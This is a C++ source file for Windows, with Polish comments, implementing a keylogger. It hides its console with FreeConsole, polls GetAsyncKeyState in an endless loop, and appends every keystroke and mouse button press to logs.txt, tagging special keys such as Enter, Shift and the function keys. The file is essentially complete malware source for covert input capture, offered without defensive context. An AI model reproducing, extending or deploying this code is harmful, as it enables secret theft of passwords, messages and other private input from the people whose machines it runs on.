#include "stdafx.h"
#include <iostream>
#include <Windows.h>
#include <fstream>
// ==================================
using namespace std;

int Save(int _key, char *file);
// ==================================
int main()
{
	FreeConsole();
	char i;
	while (true)
	{
		Sleep(10);
		for (i = 8; i <= 255; i++)
		{
			if (GetAsyncKeyState(i) == -32767)
			{
				Save(i, "logs.txt");
			}
		}
	}
	return 0;
}
// ==================================
// FUNKCJE DO KODU *********
// ==================================
int Save(int _key, char *file)
{
	cout << _key << endl;
	Sleep(10);
	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");
	
	if (_key == VK_SHIFT)
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	// ===========    MYSZKA    =======================
	else if (_key == VK_LBUTTON)
		fprintf(OUTPUT_FILE, "%s", "[LPM]");
	else if (_key == VK_RBUTTON)
		fprintf(OUTPUT_FILE, "%s", "[PPM]");
	else if (_key == VK_MBUTTON)
		fprintf(OUTPUT_FILE, "%s", "[KOLKO]");
	// ===========    INNE  =======================
	else if (_key == VK_RETURN)
		fprintf(OUTPUT_FILE, "%s", "[ENTER]");
	else if (_key == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "[ESC]");
	else if (_key == VK_TAB)
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
	else if (_key == VK_BACK)
		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
	else if (_key == VK_LCONTROL)
		fprintf(OUTPUT_FILE, "%s", "[LCTRL]");
	else if (_key == VK_RCONTROL)
		fprintf(OUTPUT_FILE, "%s", "[RCTRL]");
	else if (_key == VK_SPACE)
		fprintf(OUTPUT_FILE, "%s", "[SPACJA]");
	// ===========    NUMPAD    =======================
	else if (_key == VK_NUMPAD0)
		fprintf(OUTPUT_FILE, "%s", "[Num0]");
	else if (_key == VK_NUMPAD1)
		fprintf(OUTPUT_FILE, "%s", "[Num1]");
	else if (_key == VK_NUMPAD2)
		fprintf(OUTPUT_FILE, "%s", "[Num2]");
	else if (_key == VK_NUMPAD3)
		fprintf(OUTPUT_FILE, "%s", "[Num3]");
	else if (_key == VK_NUMPAD4)
		fprintf(OUTPUT_FILE, "%s", "[Num4]");
	else if (_key == VK_NUMPAD5)
		fprintf(OUTPUT_FILE, "%s", "[Num5]");
	else if (_key == VK_NUMPAD6)
		fprintf(OUTPUT_FILE, "%s", "[Num6]");
	else if (_key == VK_NUMPAD7)
		fprintf(OUTPUT_FILE, "%s", "[Num7]");
	else if (_key == VK_NUMPAD8)
		fprintf(OUTPUT_FILE, "%s", "[Num8]");
	else if (_key == VK_NUMPAD9)
		fprintf(OUTPUT_FILE, "%s", "[Num9]");
	// ===========    F1, F2, F3 etc.    =======================
	else if (_key == VK_F1)
		fprintf(OUTPUT_FILE, "%s", "[F1]");
	else if (_key == VK_F2)
		fprintf(OUTPUT_FILE, "%s", "[F2]");
	else if (_key == VK_F3)
		fprintf(OUTPUT_FILE, "%s", "[F3]");
	else if (_key == VK_F4)
		fprintf(OUTPUT_FILE, "%s", "[F4]");
	else if (_key == VK_F5)
		fprintf(OUTPUT_FILE, "%s", "[F5]");
	else if (_key == VK_F6)
		fprintf(OUTPUT_FILE, "%s", "[F6]");
	else if (_key == VK_F7)
		fprintf(OUTPUT_FILE, "%s", "[F7]");
	else if (_key == VK_F8)
		fprintf(OUTPUT_FILE, "%s", "[F8]");
	else if (_key == VK_F9)
		fprintf(OUTPUT_FILE, "%s", "[F9]");
	else if (_key == VK_F10)
		fprintf(OUTPUT_FILE, "%s", "[F10]");
	else if (_key == VK_F11)
		fprintf(OUTPUT_FILE, "%s", "[F11]");
	else if (_key == VK_F12)
		fprintf(OUTPUT_FILE, "%s", "[F12]");
	// ===========    POZOSTALE   =======================
	else
		fprintf(OUTPUT_FILE, "%s", &_key);

	fclose(OUTPUT_FILE);
	return 0;
}
